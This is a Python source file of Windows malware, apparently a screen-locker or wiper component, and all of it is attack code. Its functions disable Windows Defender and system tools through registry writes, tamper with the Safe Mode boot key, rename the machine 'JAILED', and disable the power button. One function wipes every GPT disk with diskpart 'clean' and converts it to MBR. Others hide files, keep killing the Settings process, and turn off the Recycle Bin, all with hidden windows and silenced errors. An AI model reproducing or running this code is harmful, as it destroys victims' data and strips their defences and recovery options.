import winreg 
import time
import psutil
import os
import subprocess
import threading

def disable_safe_mode():
    try:
        reg_key = winreg.HKEY_LOCAL_MACHINE
        reg_path = r"Software\Policies\Microsoft\Windows Defender"
        try:
            reg_key_handle = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE)
        except FileNotFoundError:
            reg_key_handle = winreg.CreateKey(reg_key, reg_path)
        winreg.SetValueEx(reg_key_handle, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(reg_key_handle)

        reg_key = winreg.HKEY_LOCAL_MACHINE
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        try:
            reg_key_handle = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE)
        except FileNotFoundError:
            reg_key_handle = winreg.CreateKey(reg_key, reg_path)
        winreg.SetValueEx(reg_key_handle, "NoStore", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(reg_key_handle)

        reg_key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            reg_key_handle = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE)
        except FileNotFoundError:
            reg_key_handle = winreg.CreateKey(reg_key, reg_path)
        winreg.SetValueEx(reg_key_handle, "NoFileAssociate", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(reg_key_handle, "NoControlPanel", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(reg_key_handle, "HideClock", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(reg_key_handle, "NoFolderOptions", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(reg_key_handle, "DisableCMD", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(reg_key_handle, "NoRun", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(reg_key_handle)

        reg_key = winreg.HKEY_LOCAL_MACHINE
        reg_path = r"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal"
        try:
            reg_key_handle = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE)
        except FileNotFoundError:
            reg_key_handle = winreg.CreateKey(reg_key, reg_path)
        winreg.SetValueEx(reg_key_handle, "Minimal", 0, winreg.REG_SZ, "")
        winreg.CloseKey(reg_key_handle)
    except Exception:
        pass

def fuckname():
    try:
        reg_key = winreg.HKEY_LOCAL_MACHINE
        reg_path = r"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"
        try:
            reg_key_handle = winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE)
        except FileNotFoundError:
            reg_key_handle = winreg.CreateKey(reg_key, reg_path)
        winreg.SetValueEx(reg_key_handle, "ComputerName", 0, winreg.REG_SZ, "JAILED")
        winreg.CloseKey(reg_key_handle)
    except Exception:
        pass

def nopower():
    subprocess.run(
        "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power /v PowerButtonAction /t REG_DWORD /d 0 /f",
        creationflags=subprocess.CREATE_NO_WINDOW,
        shell=True
    )

def nogpt():
    try:
        commands = "list disk"
        process = subprocess.run(
            ['diskpart'],
            input=commands,
            text=True,
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        disks = [line.split()[0] for line in process.stdout.splitlines() if line.startswith("Disk")]
        for disk in disks:
            commands = f"select disk {disk}\ndetail disk"
            process = subprocess.run(
                ['diskpart'],
                input=commands,
                text=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if "GPT" in process.stdout:
                commands = f"select disk {disk}\nclean\nconvert mbr"
                subprocess.run(
                    ['diskpart'],
                    input=commands,
                    text=True,
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                subprocess.run(
                    ["bcdedit", "/set", "{default}", "bootmenupolicy", "legacy"],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                subprocess.run(
                    ["bcdboot", "C:\\Windows", "/s", f"\\Device\\Harddisk{disk}\\Partition1", "/f", "MBR"],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
    except Exception:
        pass

def pers():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE) as key:
            try: winreg.DeleteValue(key, "Hidden")
            except: pass
            winreg.SetValueEx(key, "Hidden", 0, winreg.REG_DWORD, 2)
            try: winreg.DeleteValue(key, "HideFileExt")
            except: pass
            winreg.SetValueEx(key, "HideFileExt", 0, winreg.REG_DWORD, 1)
    except Exception as e:
        return
def nosettings():
    def check_process():
        while True:
            for proc in psutil.process_iter(attrs=['pid', 'name']):
                if proc.info['name'].lower() == 'systemsettings.exe':
                    try:
                        proc.kill()
                        return
                    except psutil.NoSuchProcess:
                        return
                    except psutil.AccessDenied:
                        return
                    except Exception as e:
                        return
            time.sleep(0.001)
    
    thread = threading.Thread(target=check_process)
    thread.start()        
def norecy():
    subprocess.run(r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecycleFiles /t REG_DWORD /d 1 /f', shell=True)

def yesrecy():
    subprocess.run(r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecycleFiles /f', shell=True)    